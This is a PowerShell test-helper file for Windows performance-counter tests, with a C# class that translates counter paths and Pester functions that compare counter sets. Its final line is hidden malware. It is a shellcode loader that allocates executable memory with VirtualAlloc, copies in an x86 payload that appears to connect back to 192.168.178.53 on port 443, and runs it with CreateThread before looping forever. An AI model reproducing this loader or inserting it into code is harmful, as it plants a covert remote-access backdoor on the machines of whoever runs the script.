





$helperSource = @"
using System;
using System.Globalization;
using System.Runtime.InteropServices;
using System.Text;

    public class TestCounterHelper
    {
        private const long PDH_MORE_DATA = 0x800007D2L;
        private const int PDH_MAX_COUNTER_NAME = 1024;
        private const int PDH_MAX_COUNTER_PATH = 2048;
        private const string SubKeyPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\009";

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PDH_COUNTER_PATH_ELEMENTS
        {
            [MarshalAs(UnmanagedType.LPWStr)]
            public string MachineName;

            [MarshalAs(UnmanagedType.LPWStr)]
            public string ObjectName;

            [MarshalAs(UnmanagedType.LPWStr)]
            public string InstanceName;

            [MarshalAs(UnmanagedType.LPWStr)]
            public string ParentInstance;

            public UInt32 InstanceIndex;

            [MarshalAs(UnmanagedType.LPWStr)]
            public string CounterName;
        }

        [DllImport("pdh.dll", CharSet = CharSet.Unicode)]
        private static extern uint PdhMakeCounterPath(ref PDH_COUNTER_PATH_ELEMENTS pCounterPathElements,
                                                      StringBuilder szFullPathBuffer,
                                                      ref uint pcchBufferSize,
                                                      UInt32 dwFlags);

        [DllImport("pdh.dll", CharSet = CharSet.Unicode)]
        private static extern uint PdhParseCounterPath(string szFullPathBuffer,
                                                       IntPtr pCounterPathElements, //PDH_COUNTER_PATH_ELEMENTS
                                                       ref IntPtr pdwBufferSize,
                                                       uint dwFlags);

        [DllImport("pdh.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        private static extern UInt32 PdhLookupPerfNameByIndex(string szMachineName,
                                                              uint dwNameIndex,
                                                              System.Text.StringBuilder szNameBuffer,
                                                              ref uint pcchNameBufferSize);

        private string[] _counters;

        public TestCounterHelper(string[] counters)
        {
            _counters = counters;
        }

        public string TranslateCounterName(string name)
        {
            var loweredName = name.ToLowerInvariant();

            for (var i = 1; i < _counters.Length - 1; i += 2)
            {
                if (_counters[i].ToLowerInvariant() == loweredName)
                {
                    try
                    {
                        var index = Convert.ToUInt32(_counters[i - 1], CultureInfo.InvariantCulture);
                        var sb = new StringBuilder(PDH_MAX_COUNTER_NAME);
                        var bufSize = (uint)sb.Capacity;
                        var result = PdhLookupPerfNameByIndex(null, index, sb, ref bufSize);

                        if (result == 0)
                            return sb.ToString().Substring(0, (int)bufSize - 1);
                    }
                    catch
                    {
                        // do nothing, we just won't translate
                    }

                    break;
                }
            }

            // return original path if translation failed
            return name;
        }

        public string TranslateCounterPath(string path)
        {
            var bufSize = new IntPtr(0);

            var result = PdhParseCounterPath(path,
                                             IntPtr.Zero,
                                             ref bufSize,
                                             0);
            if (result != 0 && result != PDH_MORE_DATA)
                return path;

            IntPtr structPointer = Marshal.AllocHGlobal(bufSize.ToInt32());

            try
            {
                result = PdhParseCounterPath(path,
                                             structPointer,
                                             ref bufSize,
                                             0);

                if (result == 0)
                {
                    var cpe = Marshal.PtrToStructure<PDH_COUNTER_PATH_ELEMENTS>(structPointer);

                    cpe.ObjectName = TranslateCounterName(cpe.ObjectName);
                    cpe.CounterName = TranslateCounterName(cpe.CounterName);

                    var sb = new StringBuilder(PDH_MAX_COUNTER_NAME);
                    var pathSize = (uint)sb.Capacity;

                    result = PdhMakeCounterPath(ref cpe, sb, ref pathSize, 0);

                    if (result == 0)
                        return sb.ToString().Substring(0, (int)pathSize - 1);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(structPointer);
            }

            // return original path if translation failed
            return path;
        }
    }
"@

if ( $IsWindows )
{
    Add-Type -TypeDefinition $helperSource
}


function RemoveMachineName
{
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $path
    )

    if ($path.StartsWith("\\"))
    {
        return $path.SubString($path.IndexOf("\", 2))
    }
    else
    {
        return $path
    }
}


function GetCounters
{
    if ( $IsWindows )
    {
        $key = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Perflib\CurrentLanguage'
        return (Get-ItemProperty -Path $key -Name Counter).Counter
    }
}


function TranslateCounterName
{
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $counterName
    )

    $counters = GetCounters
    if ($counters -and ($counters.Length -gt 1))
    {
        $counterHelper = New-Object -TypeName "TestCounterHelper" -ArgumentList (, $counters)
        return $counterHelper.TranslateCounterName($counterName)
    }

    return $counterName
}


function TranslateCounterPath
{
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $path
    )

    $counters = GetCounters
    if ($counters -and ($counters.Length -gt 1))
    {
        $counterHelper = New-Object -TypeName "TestCounterHelper" -ArgumentList (, $counters)
        $rv = $counterHelper.TranslateCounterPath($path)

        
        
        if (-not $path.StartsWith("\\"))
        {
            $rv = RemoveMachineName $rv
        }

        return $rv
    }

    return $path
}





function DateTimesAreEqualish
{
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNull()]
        [DateTime]
        $dtA,
        [Parameter(Mandatory)]
        [ValidateNotNull()]
        [DateTime]
        $dtB
    )

    $span = $dtA - $dtB
    return ([math]::Floor([math]::Abs($span.TotalMilliseconds)) -eq 0)
}


function CompareCounterSets
{
    param (
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $setA,
        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        $setB
    )

    $setA.Length | Should -Be $setB.Length

    
    
    
    
    
    
    
    for ($i = 1; $i -lt $setA.Length; $i++)
    {
        $setA[$i].CounterSamples.Length | Should -Be $setB[$i].CounterSamples.Length
        $samplesA = ($setA[$i].CounterSamples | Sort-Object -Property Path)
        $samplesB = ($setB[$i].CounterSamples | Sort-Object -Property Path)
        (DateTimesAreEqualish $setA[$i].TimeStamp $setB[$i].TimeStamp) | Should -BeTrue
        for ($j = 0; $j -lt $samplesA.Length; $j++)
        {
            $sampleA = $samplesA[$j]
            $sampleB = $samplesB[$j]
            (DateTimesAreEqualish $sampleA.TimeStamp $sampleB.TimeStamp) | Should -BeTrue
            $sampleA.Path | Should -BeExactly $sampleB.Path
            $sampleA.CookedValue | Should -Be $sampleB.CookedValue
        }
    }
}

function SkipCounterTests
{
    if ([System.Management.Automation.Platform]::IsLinux -or
        [System.Management.Automation.Platform]::IsMacOS -or
        [System.Management.Automation.Platform]::IsIoT)
    {
        return $true
    }

    return $false
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xb2,0x35,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

